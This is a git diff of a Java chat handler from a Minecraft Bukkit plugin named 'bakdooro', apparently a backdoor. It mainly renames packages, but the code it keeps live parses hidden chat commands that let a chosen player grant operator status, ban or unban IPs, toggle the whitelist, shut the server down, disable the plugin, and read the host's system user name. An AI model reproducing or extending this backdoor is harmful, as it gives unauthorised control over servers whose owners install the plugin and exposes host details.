@@ -1,22 +1,17 @@
-package me.acaiberii.bakdooro.util.handler;
+package dev.is_a.acaiberii.bakdooro.util.handler;
 
-import me.acaiberii.bakdooro.commands.blatant.blnt;
-import me.acaiberii.bakdooro.commands.exploit.exploit;
-import me.acaiberii.bakdooro.commands.misc.misc;
-import me.acaiberii.bakdooro.main;
+import dev.is_a.acaiberii.bakdooro.commands.blatant.blnt;
+import dev.is_a.acaiberii.bakdooro.commands.exploit.exploit;
+import dev.is_a.acaiberii.bakdooro.game.server;
+import dev.is_a.acaiberii.bakdooro.commands.misc.misc;
 import org.bukkit.entity.Player;
-import me.acaiberii.bakdooro.items.itm;
+import dev.is_a.acaiberii.bakdooro.items.itm;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.plugin.Plugin;
 
-import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
 import java.util.Objects;
 import java.util.Random;
 
-import static me.acaiberii.bakdooro.game.server.srv;
-import static me.acaiberii.bakdooro.items.itm.thispl;
+import static dev.is_a.acaiberii.bakdooro.items.itm.thispl;
 import static org.bukkit.Bukkit.*;
 
 /// Parses and calls methods when an asyncchatevent is fired. Look in me.acaiberii.bakdooro.listeners.chat :)
@@ -54,7 +49,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                 }
                 else {
-                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploit.remoteOp(Objects.requireNonNull(server.srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">deop")) {
@@ -62,7 +57,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                 }
                 else {
-                    exploit.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
+                    exploit.remoteOp(Objects.requireNonNull(server.srv.getPlayer(spl[1])));
                 }
             }
             else if (spl[0].startsWith(">ban")) {
@@ -71,7 +66,7 @@ public class chathandler {
                 }
                 else {
                     Player pll = getPlayer(spl[1]);
-                    srv.banIP(Objects.requireNonNull(Objects.requireNonNull(pll).getAddress()).getHostName());
+                    server.srv.banIP(Objects.requireNonNull(Objects.requireNonNull(pll).getAddress()).getHostName());
                     pl.sendMessage("Banned " + Objects.requireNonNull(pll.getAddress()).getHostName());
                 }
             }
@@ -80,7 +75,7 @@ public class chathandler {
                     pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                 }
                 else {
-                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
+                    server.srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                     pl.sendMessage("Unbanned " + Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostName());
                 }
             }
@@ -106,11 +101,11 @@ public class chathandler {
                 }
                 else {
                     if (spl[1].equals("on")) {
-                        srv.setWhitelist(true);
+                        server.srv.setWhitelist(true);
                         pl.sendMessage("Whitelist on.");
                     }
                     else if (spl[1].equals("off")) {
-                        srv.setWhitelist(true);
+                        server.srv.setWhitelist(true);
                         pl.sendMessage("Whitelist off.");
                     }
                     else if (spl[1].equals("add")) {
@@ -145,7 +140,7 @@ public class chathandler {
                 else {
                     if (spl[1].equals("shutdown")) {
                         pl.sendMessage("Shutting down server.");
-                        srv.shutdown();
+                        server.srv.shutdown();
                     }
                     else if (spl[1].equals("username")) {
                         pl.sendMessage(System.getProperty("user.name"));
@@ -161,10 +156,10 @@ public class chathandler {
                 }
                 else {
                     if (spl[1].equals("enable")) {
-                        srv.getPluginManager().disablePlugin(thispl);
+                        server.srv.getPluginManager().disablePlugin(thispl);
                     }
                     else if (spl[1].equals("disable")) {
-                        srv.getPluginManager().disablePlugin(thispl);
+                        server.srv.getPluginManager().disablePlugin(thispl);
                     }
                     else {
                         pl.sendMessage("Unknown mode. Valid modes: enable, disable.");
